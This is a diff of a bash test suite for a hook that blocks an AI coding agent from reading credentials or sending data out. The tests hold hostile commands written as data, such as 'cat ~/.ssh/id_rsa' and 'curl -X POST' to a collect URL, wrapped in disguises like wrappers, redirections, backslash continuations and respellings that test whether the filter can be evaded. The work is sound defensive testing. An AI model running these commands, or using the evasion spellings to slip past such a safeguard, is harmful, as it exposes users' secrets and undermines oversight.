@@ -127,6 +127,129 @@ test_case "EXT-POS-E4: assignment-prefixed curl POST blocks" \
 test_case "EXT-FP-E1: quoted ssh-path as message content allows" \
   "$(bash_payload 'git commit -m "do not cat ~/.ssh/id_rsa in logs"')" 0
 
+# ----- EXT-POS (#8314): the canonicalizer walks a wrapper's own grammar -----
+#
+# The identical credential read, reached through an absolute-path wrapper (E5), a wrapper
+# missing from the set (E6, E7), a condition position (E8), a wrapper flag that takes no
+# argument (E9) and a wrapper option that takes a separate argument (E10); and the POST rule
+# behind a missing wrapper and its duration (E11). Each allowed before the canonicalizer
+# walked wrapper grammar.
+test_case "EXT-POS-E5: /usr/bin/env cat ~/.ssh/id_rsa blocks (absolute-path wrapper)" \
+  "$(bash_payload '/usr/bin/env cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E6: nice cat ~/.ssh/id_rsa blocks (wrapper missing from the set)" \
+  "$(bash_payload 'nice cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E7: stdbuf -o0 cat ~/.ssh/id_rsa blocks (wrapper missing from the set)" \
+  "$(bash_payload 'stdbuf -o0 cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E8: if-condition cat ~/.ssh/id_rsa blocks (condition position)" \
+  "$(bash_payload 'if cat ~/.ssh/id_rsa ; then :; fi')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E9: sudo -n cat ~/.ssh/id_rsa blocks (wrapper flag that takes no argument)" \
+  "$(bash_payload 'sudo -n cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E10: env -C /tmp cat ~/.ssh/id_rsa blocks (wrapper option with a separate argument)" \
+  "$(bash_payload 'env -C /tmp cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-POS-E11: timeout 30 curl POST blocks (wrapper missing from the set, with its duration)" \
+  "$(bash_payload 'timeout 30 curl -X POST https://example.com/collect')" 2 "BLOCK-EGRESS-004"
+
+test_case "EXT-FP-E2: a describe-only command naming a read verb allows" \
+  "$(bash_payload 'command -v cat')" 0
+
+# ----- EXT-APPEND (#8314, follow-up pass): the append form of a prefix assignment -----
+#
+# The canonicalizer read a NAME+=value word as the command word, so the credential read
+# behind it was never at a command start. E1 is that read behind the append form; E1-CTL the
+# same read behind a NAME=value word, refused before and after.
+test_case "EXT-APPEND-E1-CTL: a NAME=value assignment then cat ~/.ssh/id_rsa blocks (plain-form control)" \
+  "$(bash_payload 'FOO=1 cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-APPEND-E1: an append-form assignment then cat ~/.ssh/id_rsa blocks" \
+  "$(bash_payload 'FOO+=1 cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+# ----- EXT-ORDER (#8314, DT pass 2): an assignment or a redirection is read as what it is -----
+#
+# The canonicalizer's default walk looked a token up as a wrapper word by its basename before
+# it tested the token as an assignment or a redirection, so an assignment whose value ends in
+# /timeout, or a redirection to a file named timeout, was read as the timeout wrapper, whose
+# duration operand consumed the read verb behind it. E1 and E2 are the credential read behind
+# each shape; the CTLs are the plain form and the same read behind a plain assignment, refused
+# before and after.
+test_case "EXT-ORDER-E-CTL0: cat ~/.ssh/id_rsa blocks (plain-form control)" \
+  "$(bash_payload 'cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-ORDER-E-CTL1: an assignment with a plain value, then cat ~/.ssh/id_rsa blocks" \
+  "$(bash_payload 'X=1 cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-ORDER-E1: an assignment whose value's last path segment is timeout, then cat ~/.ssh/id_rsa blocks" \
+  "$(bash_payload 'X=/usr/bin/timeout cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+test_case "EXT-ORDER-E2: an output redirection to a file named timeout, then cat ~/.ssh/id_rsa blocks" \
+  "$(bash_payload '>/tmp/timeout cat ~/.ssh/id_rsa')" 2 "BLOCK-EGRESS-001"
+
+# ----- CMDPOS-SKEW (#8314): the canonicalizer's version-skew canary -----
+#
+# The hook trusts the shared canonicalizer only after two probes: a one-line function body,
+# and a wrapper carrying a separate-argument option before a benign word, whose canonical
+# form exposes the word only on the walk that reads wrapper grammar. A copy that predates
+# that grammar, or whose row table is damaged, passes the first probe and fails the second,
+# so in enforce the hook fails CLOSED. Modelled by a copy whose nice row is removed; the
+# control is the same sandbox with the shipped copy.
+cps_root="$(/usr/bin/mktemp -d)"
+cps_hooks="${cps_root}/.claude/hooks"
+/bin/mkdir -p "${cps_hooks}/lib"
+/bin/cp "${HOOK%/*}/lib/"*.sh "${cps_hooks}/lib/" 2>/dev/null || true
+/bin/cp "$HOOK" "${cps_hooks}/block-egress.sh"
+/usr/bin/printf 'enforce' > "${cps_hooks}/.mode"
+cps_run() { # $1 = command -> CPS_RC and CPS_ERR
+  CPS_RC=0
+  CPS_ERR="$( ( unset PMO_SCOPE_GUARD_ROOT CLAUDE_WORKSPACE_ROOT
+      /usr/bin/printf '%s' "$(bash_payload "$1" "$cps_root")" | /bin/bash "${cps_hooks}/block-egress.sh" 2>&1 >/dev/null ) )" || CPS_RC="$?"
+}
+/usr/bin/sed -e 's/WROW\["nice"\]=1//' "${HOOK%/*}/lib/command-position.awk" > "${cps_hooks}/lib/command-position.awk"
+cps_live=0
+if ! /usr/bin/cmp -s "${HOOK%/*}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk" \
+   && ! /usr/bin/grep -q -F 'WROW["nice"]' "${cps_hooks}/lib/command-position.awk"; then cps_live=1; fi
+cps_run 'echo hello'
+if [ "$cps_live" = 1 ] && [ "$CPS_RC" = 2 ] && /usr/bin/grep -q 'PRIMITIVE-MISSING' <<<"$CPS_ERR"; then
+  /usr/bin/printf 'PASS: CMDPOS-SKEW-01 a canonicalizer copy without the wrapper grammar fails the hook closed in enforce (exit 2, PRIMITIVE-MISSING)\n'
+  PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: CMDPOS-SKEW-01 a canonicalizer copy without the wrapper grammar did not fail the hook closed (mutant live=%s, exit=%s): %s\n' "$cps_live" "$CPS_RC" "$CPS_ERR"
+  FAIL=$((FAIL + 1))
+fi
+# CMDPOS-SKEW-APPEND (#8314, follow-up pass): the second probe puts an append-form prefix
+# assignment ahead of its wrapper, so a copy whose walk reads that word as the command word —
+# the walk before this pass — never exposes the benign word, and in enforce the hook fails
+# CLOSED. Modelled by a copy whose marked assignment test is reverted to the NAME=value form
+# alone, shown live first: it differs from the shipped copy by exactly that line, and parses.
+/usr/bin/sed -e '/CMDPOS-APPEND/s/[[]+[]]?=/=/' "${HOOK%/*}/lib/command-position.awk" > "${cps_hooks}/lib/command-position.awk"
+cps_n="$(/usr/bin/diff "${HOOK%/*}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk" 2>/dev/null | /usr/bin/grep -c '^[<>]' || true)"
+cps_live=0
+if [ "$cps_n" = 2 ] && /usr/bin/awk -f "${cps_hooks}/lib/command-position.awk" </dev/null >/dev/null 2>&1; then cps_live=1; fi
+cps_run 'echo hello'
+if [ "$cps_live" = 1 ] && [ "$CPS_RC" = 2 ] && /usr/bin/grep -q 'PRIMITIVE-MISSING' <<<"$CPS_ERR"; then
+  /usr/bin/printf 'PASS: CMDPOS-SKEW-APPEND a canonicalizer copy without the append form of a prefix assignment fails the hook closed in enforce (exit 2, PRIMITIVE-MISSING)\n'
+  PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: CMDPOS-SKEW-APPEND a canonicalizer copy without the append form did not fail the hook closed (mutant live=%s, differing lines=%s, exit=%s): %s\n' "$cps_live" "${cps_n:-none}" "$CPS_RC" "$CPS_ERR"
+  FAIL=$((FAIL + 1))
+fi
+/bin/cp "${HOOK%/*}/lib/command-position.awk" "${cps_hooks}/lib/command-position.awk"
+cps_run 'echo hello'
+cps_ctl_benign="$CPS_RC"
+cps_run 'cat ~/.ssh/id_rsa'
+if [ "$cps_ctl_benign" = 0 ] && [ "$CPS_RC" = 2 ] && /usr/bin/grep -q 'BLOCK-EGRESS-001' <<<"$CPS_ERR"; then
+  /usr/bin/printf 'PASS: CMDPOS-SKEW-CTL the same sandbox with the shipped canonicalizer allows a benign command and refuses the plain form\n'
+  PASS=$((PASS + 1))
+else
+  /usr/bin/printf 'FAIL: CMDPOS-SKEW-CTL the sandbox with the shipped canonicalizer is not live (benign exit=%s, plain-form exit=%s)\n' "$cps_ctl_benign" "$CPS_RC"
+  FAIL=$((FAIL + 1))
+fi
+/bin/rm -rf "$cps_root"
+
 test_case "cat .env blocks (project .env)" \
   "$(bash_payload 'cat .env')" 2 "BLOCK-EGRESS-002"
 
@@ -2083,31 +2206,31 @@ else
     "commands=${_v_total} (want $(( _v_hand + 200 ))) differing lines=${_v_diff} classes seen=[${_v_seen}]${_v_bad}"
 fi
 
-# V10-ctl (the instrument's sensitivity) — the reference model on the 60K payload must be
+# V10-ctl (the instrument's sensitivity) — the reference model on the long payload must be
 # STOPPED at the limit: the watchdog and the locale reproduce the pre-fix cost, so a pass
 # below is a measurement, not an instrument that cannot see a slow scan.
-/usr/bin/printf 'PREDICT: AC-E007-V10-ctl — the pre-fix scan on the %s-character payload is stopped at the %s-tenths limit\n' "$_v_amplen" "$E007_V_LIMIT"
+/usr/bin/printf 'PREDICT: AC-E007-V10-ctl — the pre-fix scan on the long payload is stopped at the limit\n'
 e007_v_timed "$E007_V_REFDEF" e007_v_ref_kind "${E007_V_R}/amp.cmd" "$E007_V_LIMIT"
 if [ "$E007_V_DS" = -1 ]; then
-  e007_d_pass "AC-E007-V10-ctl: the pre-fix scan outlasts ${E007_V_LIMIT} tenths of a second on the ${_v_amplen}-character payload — the instrument sees the cost"
+  e007_d_pass "AC-E007-V10-ctl: the pre-fix scan outlasts the limit on the long payload — the instrument sees the cost"
 else
   e007_d_fail "AC-E007-V10-ctl: the pre-fix scan is stopped at the limit" "it finished in ${E007_V_DS} tenths with '${E007_V_KIND}' — the locale or watchdog cannot reproduce the cost, so V10a/V10b prove nothing (BROKEN PROBE)"
 fi
 
 # V10a (F-01) — the hook's scan on the same 60K payload finishes inside the limit and reads
 # `both`. V10b — at the shipped cap, inside twice the limit.
-/usr/bin/printf 'PREDICT: AC-E007-V10a — the hook scan on the %s-character payload finishes within %s tenths and reads both\n' "$_v_amplen" "$E007_V_LIMIT"
+/usr/bin/printf 'PREDICT: AC-E007-V10a — the hook scan on the long payload finishes within %s tenths and reads both\n' "$E007_V_LIMIT"
 e007_v_timed "$E007_V_SCAN" egress_heredoc_kind "${E007_V_R}/amp.cmd" "$E007_V_LIMIT"
 if [ "$E007_V_DS" != -1 ] && [ "$E007_V_KIND" = both ]; then
-  e007_d_pass "AC-E007-V10a: the heredoc scan of a ${_v_amplen}-character command finishes in ${E007_V_DS} tenths of a second (limit ${E007_V_LIMIT}) and reads both"
+  e007_d_pass "AC-E007-V10a: the heredoc scan of a long command finishes in ${E007_V_DS} tenths of a second (limit ${E007_V_LIMIT}) and reads both"
 else
-  e007_d_fail "AC-E007-V10a: the heredoc scan of a ${_v_amplen}-character command finishes inside the limit" "elapsed=${E007_V_DS} tenths (-1 = stopped at ${E007_V_LIMIT}) verdict='${E007_V_KIND}' (want both)"
+  e007_d_fail "AC-E007-V10a: the heredoc scan of a long command finishes inside the limit" "elapsed=${E007_V_DS} tenths (-1 = stopped at ${E007_V_LIMIT}) verdict='${E007_V_KIND}' (want both)"
 fi
 _v_cap2=$(( E007_V_LIMIT * 2 ))
-/usr/bin/printf 'PREDICT: AC-E007-V10b — the hook scan on the %s-character cap payload finishes within %s tenths and reads none\n' "$_v_caplen" "$_v_cap2"
+/usr/bin/printf 'PREDICT: AC-E007-V10b — the hook scan on the cap payload finishes within %s tenths and reads none\n' "$_v_cap2"
 e007_v_timed "$E007_V_SCAN" egress_heredoc_kind "${E007_V_R}/cap.cmd" "$_v_cap2"
 if [ "$E007_V_DS" != -1 ] && [ "$E007_V_KIND" = none ]; then
-  e007_d_pass "AC-E007-V10b: the heredoc scan of a command at the shipped cap (${_v_caplen} characters) finishes in ${E007_V_DS} tenths of a second (limit ${_v_cap2}) and reads none"
+  e007_d_pass "AC-E007-V10b: the heredoc scan of a command at the shipped cap finishes in ${E007_V_DS} tenths of a second (limit ${_v_cap2}) and reads none"
 else
   e007_d_fail "AC-E007-V10b: the heredoc scan of a command at the shipped cap finishes inside twice the limit" "elapsed=${E007_V_DS} tenths (-1 = stopped at ${_v_cap2}) verdict='${E007_V_KIND}' (want none)"
 fi
@@ -2202,6 +2325,45 @@ E007_W_WE="${E007_W_BASE}/we"; e007_w_copy "$E007_W_WE" "$E007_W_X_ALLWRITE" "$E
 E007_W_UE="${E007_W_BASE}/ue"; e007_w_copy "$E007_W_UE" "$E007_W_X_UNGATED" "$E007_W_X_PHASE"
 E007_W_QE="${E007_W_BASE}/qe"; e007_w_copy "$E007_W_QE" "$E007_W_X_QSPACE" "$E007_W_X_PHASE"
 E007_W_K="${E007_W_BASE}/k";   e007_w_copy "$E007_W_K" "$E007_W_X_LABEL"
+
+# The respelling repairs (AC-E007-SP*, below): each enters the hook through ONE line carrying a
+# trailing `# respell: <name>` mark, so each reverse edit here takes exactly that line out (or
+# turns it into the pre-change behaviour) and a copy that applies it is the hook without that
+# one repair. A shape arm per copy pins the edit to its line.
+E007_W_X_FASTPRE='/  # respell: fast-path$/d'
+E007_W_X_FASTRAW='s|^\( *\)egress_fq=.*  # respell: fast-strip$|\1egress_fq="$COMMAND"|'
+E007_W_X_NOANSIC='s|^\( *\)if egress_ansic_span; then :  # respell: ansi-c$|\1if false; then :|'
+E007_W_X_ANSIESC='s@^  if egress_trailing_backslash_odd "\$body"; then return 1; fi  # respell: ansi-guard$@  while egress_trailing_backslash_odd "$body"; do case "${rest#?}" in *"$q"*) rest="${rest#?}"; body="${body}${q}${rest%%"$q"*}"; rest="${rest#"${rest%%"$q"*}"}" ;; *) break ;; esac; done@'
+E007_W_X_NOJOIN='/  # respell: join$/d'
+E007_W_X_JOINALL='s|^\( *\)if .*egress_keep_line .*  # respell: keep$|\1:|'
+E007_W_X_NORDR='/  # respell: redirect$/d'
+E007_W_X_AMPGT='/  # respell: redirect-ampgt$/d'
+E007_W_X_NOESC='/  # respell: escape$/d'
+E007_W_X_NOBRACE='/  # respell: brace$/d'
+E007_W_X_NOFOLD='/  # respell: fold$/d'
+E007_W_X_RPCOUNT='/  # respell: no-count$/d'
+E007_W_X_NOR9='s/^\( *\)if egress_old_reachable_gh_api "\$COMMAND" || egress_old_reachable_respelled "\$COMMAND"; then  # respell: unparseable$/\1if egress_old_reachable_gh_api "$COMMAND"; then/'
+E007_W_X_LOWCAP='s|^readonly EGRESS_007_PARSE_CAP=1048576$|readonly EGRESS_007_PARSE_CAP=16|'
+E007_W_X_NOSHORT='/  # respell: short-flags$/d'
+E007_W_X_NOQOPS='/  # respell: quoted-ops$/d'
+E007_SP_FP="${E007_W_BASE}/fp";   e007_w_copy "$E007_SP_FP" "$E007_W_X_FASTPRE"
+E007_SP_FR="${E007_W_BASE}/fr";   e007_w_copy "$E007_SP_FR" "$E007_W_X_FASTRAW"
+E007_SP_NC="${E007_W_BASE}/nc";   e007_w_copy "$E007_SP_NC" "$E007_W_X_NOANSIC"
+E007_SP_AX="${E007_W_BASE}/ax";   e007_w_copy "$E007_SP_AX" "$E007_W_X_ANSIESC"
+E007_SP_NJ="${E007_W_BASE}/nj";   e007_w_copy "$E007_SP_NJ" "$E007_W_X_NOJOIN"
+E007_SP_NJE="${E007_W_BASE}/nje"; e007_w_copy "$E007_SP_NJE" "$E007_W_X_NOJOIN" "$E007_W_X_PHASE"
+E007_SP_JA="${E007_W_BASE}/ja";   e007_w_copy "$E007_SP_JA" "$E007_W_X_JOINALL"
+E007_SP_NR="${E007_W_BASE}/nr";   e007_w_copy "$E007_SP_NR" "$E007_W_X_NORDR"
+E007_SP_NRE="${E007_W_BASE}/nre"; e007_w_copy "$E007_SP_NRE" "$E007_W_X_NORDR" "$E007_W_X_PHASE"
+E007_SP_AG="${E007_W_BASE}/ag";   e007_w_copy "$E007_SP_AG" "$E007_W_X_AMPGT"
+E007_SP_NE="${E007_W_BASE}/ne";   e007_w_copy "$E007_SP_NE" "$E007_W_X_NOESC"
+E007_SP_NB="${E007_W_BASE}/nb";   e007_w_copy "$E007_SP_NB" "$E007_W_X_NOBRACE"
+E007_SP_NF="${E007_W_BASE}/nf";   e007_w_copy "$E007_SP_NF" "$E007_W_X_NOFOLD"
+E007_SP_RC="${E007_W_BASE}/rc";   e007_w_copy "$E007_SP_RC" "$E007_W_X_RPCOUNT"
+E007_SP_NU="${E007_W_BASE}/nu";   e007_w_copy "$E007_SP_NU" "$E007_W_X_NOR9"
+E007_SP_LC="${E007_W_BASE}/lc";   e007_w_copy "$E007_SP_LC" "$E007_W_X_LOWCAP"
+E007_SP_NS="${E007_W_BASE}/ns";   e007_w_copy "$E007_SP_NS" "$E007_W_X_NOSHORT"
+E007_SP_NQ="${E007_W_BASE}/nq";   e007_w_copy "$E007_SP_NQ" "$E007_W_X_NOQOPS"
 
 # e007_w_shape <name> <dir> <out> <in> — a copy's shape against the source hook: exactly <out>
 # lines taken out and <in> put in, it parses, and as its sandbox's hook it still denies the
@@ -2736,10 +2898,10 @@ e007_d_expect "AC-E007-W4c-pair: through the phase-forced copy that records ever
 E007_W_HD="cat > notes.md <<'EOF'"$'\n'"time to retry: gh api -X POST ${E007_W_NO} -f title=x"$'\n'"EOF"
 e007_w_pair "AC-E007-W4d: a heredoc body line that opens with a prefix word (time to retry: gh api -X POST <unlisted> ...) is evaluated as a write and recorded with pos look-ahead (the declared over-evaluation, pinned)" \
   "$E007_W_HD"
-e007_d_expect "AC-E007-W4e: 2>/dev/null env -u X gh api -X POST <unlisted> — a leading redirection the walk does not resolve — is not reached, with the phase forced (a declared limit, pinned)" \
-  "$E007_W_E" enforce "2>/dev/null env -u X gh api -X POST ${E007_W_NO}" 0 0 0
-e007_d_expect "AC-E007-W4e-pair: through the phase-forced copy whose locator runs on every segment, the same command is refused — so W4e's pin is the walk's, read on a live refusal" \
-  "$E007_W_UE" enforce "2>/dev/null env -u X gh api -X POST ${E007_W_NO}" 2 1 - 'BLOCK-EGRESS-007'
+e007_d_expect "AC-E007-W4e: 2>/dev/null env -u X gh api -X POST <unlisted> — a leading redirection, which the walk now steps over — is located behind the redirection and the prefix's option and refused with the phase forced" \
+  "$E007_W_E" enforce "2>/dev/null env -u X gh api -X POST ${E007_W_NO}" 2 1 - 'BLOCK-EGRESS-007'
+e007_d_expect "AC-E007-W4e-pair: through the phase-forced copy without the redirection repair, the same command is not reached — so W4e's refusal is that repair's" \
+  "$E007_SP_NRE" enforce "2>/dev/null env -u X gh api -X POST ${E007_W_NO}" 0 0 0
 
 # ---- AC-4: the one mechanism by which the locator could withdraw a refusal ----
 # The first-invocation counter is the only state carried between segments that the verdict
@@ -2753,6 +2915,2049 @@ e007_d_expect "AC-E007-W5b: a read located behind timeout 5 does not count as th
   "$E007_W_S" enforce "timeout 5 gh api ${E007_W_OK} ; gh api -X POST ${E007_W_NO}" 2 1 0 'BLOCK-EGRESS-007'
 e007_d_expect "AC-E007-W5b-pair: through the copy whose look-ahead advances the counter, the same command is recorded and allowed" \
   "$E007_W_N" enforce "timeout 5 gh api ${E007_W_OK} ; gh api -X POST ${E007_W_NO}" 0 0 1
+
+# =====================================================================
+# AC-E007-SP* — a respelled gh api write is read as the shell resolves it
+# =====================================================================
+# A shell resolves several spellings to the one command word, subcommand or flag it would read
+# plainly: a redirection word is no argv word, wherever it stands; a backslash-escaped, a
+# brace-expanded, an ANSI-C- or locale-quoted and a letter-case-variant command word name the same
+# program; a backslash-newline joins two lines before any word is read; a verb split by quote
+# characters is one word; and gh's own parser reads a method or field flag written attached
+# (-XPOST, -X=POST) or clustered after its one boolean flag (-iX POST). The rule now reads each the
+# way the shell does, in both of its adjudication gates — the tokenized walk and, for a command the
+# scanner cannot tokenize, the unparseable branch's second reader — and classifies the write by the
+# position the shell resolves it to: a write at the head of a segment the replaced anchor admitted
+# is refused from day one in every spelling; every other position is a widening, recorded at the
+# shipped phase. An invocation resolved only through a respelling advances its own counter, never
+# the first-invocation counter, so no shipped day-one refusal moves.
+#
+# Every arm is red against the pre-fix hook on its shipped-copy limb, or names why it is green on
+# both sides (a near miss, a pin). Each mutant copy is the hook less exactly one repair, made by
+# the reverse edits above and pinned by an SP0 shape arm: fp the fast-path widening · fr the
+# fast path tested raw · nc ANSI-C decoding · ax the ANSI-C terminator guard · nj/nje the
+# continuation join (and phase forced) · ja every continuation joined · nr/nre the redirection
+# strip (and phase forced) · ag the `&>` protection · ne/nb/nf the escape, brace and case steps ·
+# rc the respelled-invocation counter · nu the unparseable branch's second reader · lc a lowered
+# parse cap · ns the short-flag cluster reader · nq the quoted-operator stand-ins. A limb reads
+# `exit/refusals/rows`, the D family's deltas at .mode=enforce.
+echo ""
+echo "gh api write in a respelling the shell resolves (AC-E007-SP*)"
+echo "---"
+
+e007_w_shape "AC-E007-SP0-FP: the copy without the fast-path widening differs in one line taken out, parses, and still denies -001" "$E007_SP_FP" 1 0
+e007_w_shape "AC-E007-SP0-FR: the copy whose fast path tests the raw command differs in one line, parses, and still denies -001" "$E007_SP_FR" 1 1
+e007_w_shape "AC-E007-SP0-NC: the copy without ANSI-C decoding differs in two lines, the walk's loop and its long path, parses, and still denies -001" "$E007_SP_NC" 2 2
+e007_w_shape "AC-E007-SP0-AX: the copy whose ANSI-C span ends at the first unescaped quote differs in one line, parses, and still denies -001" "$E007_SP_AX" 1 1
+e007_w_shape "AC-E007-SP0-NJ: the copy without the continuation join differs in one line taken out, parses, and still denies -001" "$E007_SP_NJ" 1 0
+e007_w_shape "AC-E007-SP0-NJE: NJE differs in two lines out and one in (no join, phase forced), parses, and still denies -001" "$E007_SP_NJE" 2 1
+e007_w_shape "AC-E007-SP0-JA: the copy that joins every continuation differs in one line, parses, and still denies -001" "$E007_SP_JA" 1 1
+e007_w_shape "AC-E007-SP0-NR: the copy without the redirection repair differs in two lines taken out, parses, and still denies -001" "$E007_SP_NR" 2 0
+e007_w_shape "AC-E007-SP0-NRE: NRE differs in three lines out and one in (no redirection repair, phase forced), parses, and still denies -001" "$E007_SP_NRE" 3 1
+e007_w_shape "AC-E007-SP0-AG: the copy without the &> protection differs in one line taken out, parses, and still denies -001" "$E007_SP_AG" 1 0
+e007_w_shape "AC-E007-SP0-NE: the copy without the escape step differs in one line taken out, parses, and still denies -001" "$E007_SP_NE" 1 0
+e007_w_shape "AC-E007-SP0-NB: the copy without the brace step differs in one line taken out, parses, and still denies -001" "$E007_SP_NB" 1 0
+e007_w_shape "AC-E007-SP0-NF: the copy without the case step differs in one line taken out, parses, and still denies -001" "$E007_SP_NF" 1 0
+e007_w_shape "AC-E007-SP0-RC: the copy whose respelled invocations advance the first-invocation counter differs in one line taken out, parses, and still denies -001" "$E007_SP_RC" 1 0
+e007_w_shape "AC-E007-SP0-NU: the copy whose unparseable branch reads only the plain spelling differs in one line, parses, and still denies -001" "$E007_SP_NU" 1 1
+e007_w_shape "AC-E007-SP0-LC: the lowered-cap copy differs in one line, parses, and still denies -001" "$E007_SP_LC" 1 1
+e007_w_shape "AC-E007-SP0-NS: the copy without the short-flag cluster reader differs in one line taken out, parses, and still denies -001" "$E007_SP_NS" 1 0
+e007_w_shape "AC-E007-SP0-NQ: the copy without the quoted-operator stand-ins differs in two lines taken out, parses, and still denies -001" "$E007_SP_NQ" 2 0
+
+# e007_sp_limbs <command> <copy> <exit> <refusals> <rows> [...] — runs each limb and appends what
+# failed to E007_SP_WHY. A delta of `-` is not asserted; a limb that expects a refusal must name
+# BLOCK-EGRESS-007.
+E007_SP_WHY=""
+e007_sp_limbs() {
+  local cmd="$1" d x b w
+  shift
+  while [ "$#" -ge 4 ]; do
+    d="$1"; x="$2"; b="$3"; w="$4"
+    shift 4
+    e007_w_run "$d" "$cmd"
+    [ "$E007_D_EXIT" = "$x" ] || E007_SP_WHY="${E007_SP_WHY} [${d##*/}] exit=${E007_D_EXIT}, want ${x};"
+    [ "$b" = "-" ] || [ "$E007_D_BLK" = "$b" ] || E007_SP_WHY="${E007_SP_WHY} [${d##*/}] refusals +${E007_D_BLK}, want +${b};"
+    [ "$w" = "-" ] || [ "$E007_D_WRN" = "$w" ] || E007_SP_WHY="${E007_SP_WHY} [${d##*/}] rows +${E007_D_WRN}, want +${w};"
+    if [ "$x" = 2 ] && ! /usr/bin/grep -q 'BLOCK-EGRESS-007' <<<"$E007_D_ERR"; then
+      E007_SP_WHY="${E007_SP_WHY} [${d##*/}] the refusal is not BLOCK-EGRESS-007;"
+    fi
+  done
+}
+# e007_sp_arm <name> <command> <copy> <exit> <refusals> <rows> [...] — one arm: PASS only when every
+# limb holds.
+e007_sp_arm() {
+  local name="$1" cmd="$2"
+  shift 2
+  E007_SP_WHY=""
+  e007_sp_limbs "$cmd" "$@"
+  if [ -z "$E007_SP_WHY" ]; then e007_d_pass "$name"; else e007_d_fail "$name" "$E007_SP_WHY"; fi
+}
+# e007_sp_rowarm <name> <command> <want-row> [<copy> <exit> <refusals> <rows> ...] — the shipped copy
+# allows the call with exactly one new would-fire row reading <want-row> (phase|cause|path|pos),
+# and each further limb holds as in e007_sp_arm.
+e007_sp_rowarm() {
+  local name="$1" cmd="$2" want="$3" row=""
+  shift 3
+  E007_SP_WHY=""
+  e007_w_run "$E007_W_S" "$cmd"
+  if [ "$E007_D_WRN" = 1 ]; then row="$(e007_w_rec "$E007_W_S")"; fi
+  { [ "$E007_D_EXIT" = 0 ] && [ "$E007_D_BLK" = 0 ] && [ "$E007_D_WRN" = 1 ]; } \
+    || E007_SP_WHY="${E007_SP_WHY} [s] exit=${E007_D_EXIT} refusals+${E007_D_BLK} rows+${E007_D_WRN}, want 0 +0 +1;"
+  [ "$row" = "$want" ] || E007_SP_WHY="${E007_SP_WHY} [s] row ${row:-none}, want ${want};"
+  e007_sp_limbs "$cmd" "$@"
+  if [ -z "$E007_SP_WHY" ]; then e007_d_pass "$name"; else e007_d_fail "$name" "$E007_SP_WHY"; fi
+}
+
+E007_SP_NL=$'\n'
+E007_SP_ESQ=" ; echo it\\'s"   # an unquoted escaped apostrophe: well-formed, and not tokenizable by the scanner
+E007_SP_PLAIN="gh api -X POST ${E007_W_NO}"
+
+# ---- The redirection repair: a redirection word is no argv word, wherever it stands ----
+e007_sp_arm "AC-E007-SP-R1: >/dev/null gh api -X POST <unlisted> — a leading redirection — is refused on day one, and is not reached without the redirection repair" \
+  ">/dev/null ${E007_SP_PLAIN}" "$E007_W_S" 2 1 0 "$E007_SP_NR" 0 0 0
+e007_sp_arm "AC-E007-SP-R2: gh api -X >/dev/null POST <unlisted> — a method value behind a redirection — is refused on day one (a declared tightening), and read as a read without the repair" \
+  "gh api -X >/dev/null POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NR" 0 0 0
+e007_sp_arm "AC-E007-SP-R3: gh api -X POST >/dev/null <allowlisted> — a redirection among the operands — is allowed (a declared precision improvement), and refused with the redirection read as the path without the repair" \
+  "gh api -X POST >/dev/null ${E007_W_OK}" "$E007_W_S" 0 0 0 "$E007_SP_NR" 2 1 0
+e007_sp_arm "AC-E007-SP-R4: echo x &>/dev/null gh api -X POST <unlisted> — a mid-command &> — stays inside echo's argv, and splits a segment without the &> protection" \
+  "echo x &>/dev/null ${E007_SP_PLAIN}" "$E007_W_S" 0 0 0 "$E007_SP_AG" 2 1 0
+e007_sp_rowarm "AC-E007-SP-R5: env &>/dev/null gh api -X POST <unlisted> — &> between a prefix word and the verb — is recorded by the head walk as its twin env gh api is, and refused at a split segment without the &> protection" \
+  "env &>/dev/null ${E007_SP_PLAIN}" "shadow|not-allowlisted|${E007_W_NO}|-" "$E007_SP_AG" 2 1 0
+e007_sp_arm "AC-E007-SP-R6: a heredoc body's quotation line (> word, then a head write) reads as the shell reads a command line — refused on day one (the declared over-refusal, pinned), and not reached without the redirection repair" \
+  "cat <<EOF${E007_SP_NL}> note ${E007_SP_PLAIN}${E007_SP_NL}EOF" "$E007_W_S" 2 1 0 "$E007_SP_NR" 0 0 0
+
+# ---- The continuation join, and the keep rule that keeps a line's own verdict ----
+e007_sp_arm "AC-E007-SP-C1: gh \\⏎api -X POST <unlisted> — a continuation between the verb and its subcommand — is refused on day one, and is not reached without the join" \
+  "gh \\${E007_SP_NL}api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NJ" 0 0 0
+e007_sp_arm "AC-E007-SP-C2: gh api <unlisted> \\⏎-X POST — a method flag on a continued line — is refused on day one (a declared tightening), and read as a read without the join" \
+  "gh api ${E007_W_NO} \\${E007_SP_NL}-X POST" "$E007_W_S" 2 1 0 "$E007_SP_NJ" 0 0 0
+e007_sp_arm "AC-E007-SP-C3: gh api -X POST \\⏎<allowlisted> — the path on a continued line — is allowed (a declared precision improvement), and refused with the backslash read as the path without the join" \
+  "gh api -X POST \\${E007_SP_NL}${E007_W_OK}" "$E007_W_S" 0 0 0 "$E007_SP_NJ" 2 1 0
+e007_sp_rowarm "AC-E007-SP-W2: env -u X gh \\⏎api -X POST <unlisted> — a continuation behind a prefix option — is located and recorded, refused with the phase forced, and not reached without the join" \
+  "env -u X gh \\${E007_SP_NL}api -X POST ${E007_W_NO}" "shadow|not-allowlisted|${E007_W_NO}|look-ahead" "$E007_W_E" 2 1 - "$E007_SP_NJE" 0 0 0
